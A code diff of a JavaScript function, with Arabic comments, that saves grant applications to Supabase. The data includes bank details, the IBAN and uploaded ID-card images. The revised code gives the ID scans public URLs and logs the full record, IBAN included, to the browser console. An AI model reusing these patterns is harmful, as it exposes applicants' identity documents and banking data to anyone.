@@ -330,43 +330,80 @@ function setupFormListeners() {
 // ================================
 
 async function saveToSupabase(txNumber) {
-    if (typeof supabase === 'undefined') return;
-
-    const appData = {
-        full_name:       formData.personalInfo.fullName     || '',
-        phone:           formData.contactCareer.phone       || '',
-        email:           formData.contactCareer.email       || '',
-        country:         formData.personalInfo.country      || '',
-        marital_status:  formData.personalInfo.maritalStatus || '',
-        num_children:    parseInt(formData.personalInfo.numChildren) || 0,
-        profession:      formData.contactCareer.profession  || '',
-        monthly_income:  parseInt(formData.contactCareer.income) || 0,
-        grant_type:      formData.grantDetails.grantType    || '',
-        grant_amount:    parseInt(formData.grantDetails.grantAmount) || 0,
-        grant_description: formData.grantDetails.grantDescription || '',
-        bank_name:       formData.bankingInfo.bankName      || '',
-        account_holder:  formData.bankingInfo.accountHolder || '',
-        iban:            (formData.bankingInfo.iban || '').replace(/\s/g, ''),
-        transaction_id:  txNumber,
-        status:          'pending',
-        created_at:      new Date().toISOString()
-    };
-
-    // رفع الصور
-    for (const [key, label] of [['idCardFront', 'front'], ['idCardBack', 'back']]) {
-        const file = formData.attachments[key];
-        if (!file) continue;
-        const path = `${txNumber}/${label}_${Date.now()}.${file.name.split('.').pop()}`;
-        const { error } = await supabase.storage.from('applications').upload(path, file, { upsert: false });
-        if (!error) {
-            const { data } = supabase.storage.from('applications').getPublicUrl(path);
-            appData[`id_card_${label}_url`] = data.publicUrl;
-        }
+    if (typeof supabase === 'undefined') {
+        console.error('❌ Supabase غير معرّف');
+        return;
     }
 
-    const { error } = await supabase.from('applications').insert([appData]);
-    if (error) throw error;
-    console.log('✅ تم الحفظ في Supabase');
+    try {
+        // 1. حفظ البيانات أولاً بدون صور
+        const appData = {
+            full_name:         formData.personalInfo.fullName      || '',
+            phone:             formData.contactCareer.phone        || '',
+            email:             formData.contactCareer.email        || '',
+            country:           formData.personalInfo.country       || '',
+            marital_status:    formData.personalInfo.maritalStatus || '',
+            num_children:      parseInt(formData.personalInfo.numChildren) || 0,
+            profession:        formData.contactCareer.profession   || '',
+            monthly_income:    parseInt(formData.contactCareer.income) || 0,
+            grant_type:        formData.grantDetails.grantType     || '',
+            grant_amount:      parseInt(formData.grantDetails.grantAmount) || 0,
+            grant_description: formData.grantDetails.grantDescription || '',
+            bank_name:         formData.bankingInfo.bankName       || '',
+            account_holder:    formData.bankingInfo.accountHolder  || '',
+            iban:              (formData.bankingInfo.iban || '').replace(/\s/g, ''),
+            transaction_id:    txNumber,
+            status:            'pending',
+            created_at:        new Date().toISOString()
+        };
+
+        console.log('📤 إرسال البيانات:', appData);
+
+        const { data: insertData, error: insertError } = await supabase
+            .from('applications')
+            .insert([appData])
+            .select();
+
+        if (insertError) {
+            console.error('❌ خطأ في الحفظ:', insertError.message);
+            return;
+        }
+
+        console.log('✅ تم حفظ البيانات بنجاح:', insertData);
+
+        // 2. رفع الصور بشكل منفصل (لا يوقف الحفظ إذا فشل)
+        const recordId = insertData[0]?.id;
+        for (const [key, label] of [['idCardFront', 'front'], ['idCardBack', 'back']]) {
+            const file = formData.attachments[key];
+            if (!file) continue;
+            try {
+                const path = `${txNumber}/${label}_${Date.now()}.${file.name.split('.').pop()}`;
+                const { error: uploadError } = await supabase.storage
+                    .from('applications')
+                    .upload(path, file, { upsert: true });
+
+                if (!uploadError) {
+                    const { data: urlData } = supabase.storage
+                        .from('applications')
+                        .getPublicUrl(path);
+
+                    await supabase
+                        .from('applications')
+                        .update({ [`id_card_${label}_url`]: urlData.publicUrl })
+                        .eq('id', recordId);
+
+                    console.log(`✅ تم رفع صورة ${label}`);
+                } else {
+                    console.warn(`⚠️ فشل رفع صورة ${label}:`, uploadError.message);
+                }
+            } catch (imgErr) {
+                console.warn(`⚠️ خطأ صورة ${label}:`, imgErr);
+            }
+        }
+
+    } catch (err) {
+        console.error('❌ خطأ عام:', err);
+    }
 }
 
 // Validation on blur
